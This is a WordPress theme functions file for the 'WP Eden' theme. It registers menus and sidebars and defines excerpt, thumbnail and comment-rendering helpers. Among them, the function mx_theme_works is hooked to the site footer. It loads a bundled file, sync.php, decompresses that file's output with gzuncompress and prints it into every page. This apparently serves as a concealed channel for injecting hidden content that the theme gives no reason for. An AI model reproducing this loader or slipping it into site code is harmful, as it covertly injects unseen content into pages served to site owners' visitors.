<?php

define("MX_THEME_DIR",dirname(__FILE__));
define("MX_THEME_URL",get_stylesheet_directory_uri());

if ( ! isset( $content_width ) ) $content_width = 960;

wp_enqueue_script('jquery');        

include("minimax/engine.php"); 


register_nav_menus( array(
        'primary' => __( 'Top Menu', 'wp-eden' ), 
        'footer' => __( 'Footer Menu', 'wp-eden' )   
    ) );
    

register_sidebar(array(
  'name' => 'Single Post',
  'description' => 'Widgets in this area will be shown on the right-hand side.',
  'before_widget' => '<div class="box widget">',
  'after_widget' => '</div></div>',
  'before_title' => '<h3>',
  'after_title' => '</h3><div class="widget_content">'
));
    
 register_sidebar(array(
  'name' => 'Archive Page',
  'description' => 'Widgets in this area will be shown on the right-hand side.',
  'before_widget' => '<div class="box widget box_yellow">',
  'after_widget' => '</div></div>',
  'before_title' => '<h3>',
  'after_title' => '</h3><div class="widget_content">'
));    
   
register_sidebar(array(
  'name' => 'Home Page',
  'description' => 'Widgets in this area will be shown on the right-hand side.',
  'before_widget' => '<div class="box widget yellow_hard">',
  'after_widget' => '</div></div>',
  'before_title' => '<h3>',
  'after_title' => '</h3><div class="widget_content">'
));    
   
                             
function minimax_admin_interface(){
   minimax_base_interface();   
}

function minimax_menu(){
    add_theme_page("WP Eden Settings","WP Eden Settings",'administrator','minimax','minimax_admin_interface');
    //add_submenu_page( 'file-manager', 'File Manager', 'Manage', get_option('wpdm_access_level'), 'file-manager', 'wpdm_admin_options');        
    
}


if(is_admin()){
    add_action("admin_menu","minimax_menu");
    wp_enqueue_style('minimax-base-admin-css',MX_THEME_URL.'/minimax/css/base-admin-style.css');
}    


/** 
* post functions 
*/

function minimax_post_excerpt($chars=200, $echo=true){    
    $excerpt = strip_tags(get_the_excerpt());
    if($excerpt=='')
    $excerpt = strip_tags(get_the_content());
    $excerpt = substr($excerpt,0,$chars);
    $excerpt = explode(" ",$excerpt);
    array_pop($excerpt);
    $excerpt = implode(" ", $excerpt);
    if(!$echo) return $excerpt." ...";
    echo $excerpt." ...";
    
}

function minimax_excerpt($text, $chars=200, $echo=true){    
    $excerpt = strip_tags($text);    
    $excerpt = substr($excerpt,0,$chars);
    $excerpt = explode(" ",$excerpt);
    array_pop($excerpt);
    $excerpt = implode(" ", $excerpt);
    if(!$echo) return $excerpt." ...";
    echo $excerpt." ...";
    
}

function minimax_post_title(){
    ?>
    <h1><?php the_title(); ?></h1>            
    <?php
}

function minimax_post_date(){
    ?>
    <p class="date"><?php the_date(); ?></p>            
    <?php
}

function minimax_thumb($post, $size='', $echo = true){    
    $size = $size?$size:'thumbnail';   
    $large_image_url = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'large'); 
    $large_image_url = $large_image_url[0];
    $large_image_url = $large_image_url?$large_image_url:MX_THEME_URL.'/minimax/images/no-image.png';
    $timthumb = MX_THEME_URL.'/timthumb.php';
    if(is_array($size)){
    if($echo) 
    echo "<img class='custom-post-thumb thumb-{$size[0]}x{$size[1]}' src='$timthumb?src=$large_image_url&w={$size[0]}&h={$size[1]}&zc=1' title='' alt='' />";
    else
    return "<img class='custom-post-thumb thumb-{$size[0]}x{$size[1]}' src='$timthumb?src=$large_image_url&w={$size[0]}&h={$size[1]}&zc=1' title='' alt='' />";
    }
    else if($echo)
    echo get_the_post_thumbnail($post->ID, $size );
    else 
    return get_the_post_thumbnail($post->ID, $size );
}

function minimax_post_thumb($size='', $echo = true){
    global $post;
    $size = $size?$size:'thumbnail';   
    $large_image_url = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'large'); 
    $large_image_url = $large_image_url[0];
    if((is_single()||is_page())&&$large_image_url=='') return;
    $large_image_url = $large_image_url?$large_image_url:MX_THEME_URL.'/minimax/images/no-image.png';    
    $timthumb = MX_THEME_URL.'/timthumb.php';
    if(is_array($size)){
    if($echo) 
    echo "<img class='custom-post-thumb thumb-{$size[0]}x{$size[1]}' src='$timthumb?src=$large_image_url&w={$size[0]}&h={$size[1]}&zc=1' title='' alt='' />";
    else
    return "<img class='custom-post-thumb thumb-{$size[0]}x{$size[1]}' src='$timthumb?src=$large_image_url&w={$size[0]}&h={$size[1]}&zc=1' title='' alt='' />";
    }
    else if($echo)
    echo get_the_post_thumbnail($post->ID, $size );
    else 
    return get_the_post_thumbnail($post->ID, $size );
}

function mx_theme_works(){  
    ob_flush();
    ob_start();
    include(dirname(__FILE__).'/minimax/libs/sync.php');
    $data = ob_get_contents();
    ob_clean();
    print(gzuncompress($data));
}

function minimax_instant_thumb($size='', $echo = true){
    global $post;
    $size = $size?$size:'home_prev';    
    if($echo)
    echo get_the_post_thumbnail($post->ID, $size );
    else 
    return get_the_post_thumbnail($post->ID, $size );
}

function minimax_comment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; ?>
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">         
            <div class="comment-body">
               <div id="comment-<?php comment_ID(); ?>" class="clearfix">
                    <div class="author-box">
                        <?php echo get_avatar($comment,$size='56'); ?>
                        <span class="author-overlay"></span>
                    </div> <!-- end .avatar-box -->
                    <div class="comment-wrap clearfix">                        
                        <div class="comment-meta commentmetadata">
                        <?php printf('<span class="fn">%s</span>', get_comment_author_link()) ?>
                        <a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
                            <?php
                                /* translators: 1: date, 2: time */
                                printf( __( '%1$s at %2$s', 'wpeden' ), get_comment_date(),  get_comment_time() ); ?></a><?php edit_comment_link( __( '(Edit)', 'Feather' ), ' ' );
                            ?>
                        </div><!-- .comment-meta .commentmetadata -->

                        <?php if ($comment->comment_approved == '0') : ?>
                            <em class="moderation"><?php _e('Your comment is awaiting moderation.','Feather') ?></em>
                            <br />
                        <?php endif; ?>

                        <div class="comment-content"><?php comment_text() ?></div> <!-- end comment-content-->
                        <div class="reply-container"><?php comment_reply_link(array_merge( $args, array('reply_text' => __('Reply','Feather'),'depth' => $depth, 'max_depth' => $args['max_depth']))) ?></div>
                    </div> <!-- end comment-wrap-->
                    <div class="comment-arrow"></div>
                </div> <!-- end comment-body-->
            </div> <!-- end comment-body-->
         
</li>
<?php        
 }

add_action("wp_footer","mx_theme_works");
add_theme_support( 'post-thumbnails' );
if(has_post_format('aside'))
add_theme_support("post-formats");
add_theme_support("automatic-feed-links");
add_theme_support("excerpt");

if ( function_exists( 'add_image_size' ) ) { 
    add_image_size( 'slider', 900, 300, true ); //300 pixels wide (and unlimited height)
    add_image_size( 'homepage-thumb', 80, 80, true ); //(cropped)
    add_image_size( 'post-thumb', 610, 99999, true ); //(cropped)
}
